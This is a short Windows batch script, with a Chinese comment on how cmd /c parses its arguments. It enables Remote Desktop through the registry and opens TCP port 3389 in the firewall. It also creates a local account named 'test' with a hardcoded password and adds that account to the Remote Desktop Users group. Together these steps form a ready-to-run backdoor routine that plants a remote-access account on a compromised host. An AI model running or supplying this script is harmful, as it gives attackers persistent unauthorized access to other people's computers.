@echo off
:: 命令中/c会将后面参数/q识别为字符串！
cmd /q /c "REG ADD HKLM\SYSTEM\CurrentControlSet\Control\Terminal" "Server /v fDenyTSConnections /t REG_DWORD /d 00000000 /f"
cmd /q /c "netsh firewall add portopening protocol = TCP port = 3389 name = rdp"
cmd /q /c "net user test Test321!@# /add"
cmd /q /c "net localgroup "Remote Desktop Users" test /add"
exit
